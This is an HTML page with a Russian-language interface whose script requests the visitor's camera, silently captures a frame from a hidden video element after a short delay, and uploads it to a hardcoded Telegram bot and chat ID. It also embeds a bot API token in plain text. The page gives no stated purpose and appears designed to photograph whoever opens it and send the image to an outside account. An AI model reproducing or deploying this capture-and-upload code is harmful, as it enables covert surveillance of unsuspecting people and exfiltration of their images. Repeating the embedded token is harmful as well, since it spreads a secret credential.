<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      text-align: center;
      font-size: 18px;
      padding: 20px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <div id="status">Запрос камеры...</div>
  <video id="video" autoplay playsinline muted></video>

  <script>
    const statusText = document.getElementById('status');
    const video = document.getElementById('video');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        statusText.textContent = "Камера включена. Готовим фото...";
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);

          const imageData = canvas.toDataURL("image/jpeg");
          const blob = dataURLtoBlob(imageData);
          const formData = new FormData();
          formData.append("chat_id", "534660099");
          formData.append("photo", blob, "photo.jpg");

          fetch("https://api.telegram.org/bot7788731701:AAHQ-lZxM-W1zil4BHMIFQM8-inES5MZZpY/sendPhoto", {
            method: "POST",
            body: formData
          })
          .then(response => {
            if (response.ok) {
              statusText.textContent = "✅ Фото отправлено в Telegram!";
            } else {
              response.text().then(text => {
                statusText.textContent = "❌ Ошибка отправки в Telegram:\n" + text;
              });
            }
          })
          .catch(error => {
            statusText.textContent = "❌ Ошибка сети:\n" + error;
          });

        }, 2500);
      })
      .catch(error => {
        statusText.textContent = "❌ Нет доступа к камере:\n" + error;
      });

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
      bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while(n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], {type:mime});
    }
  </script>
</body>
</html>
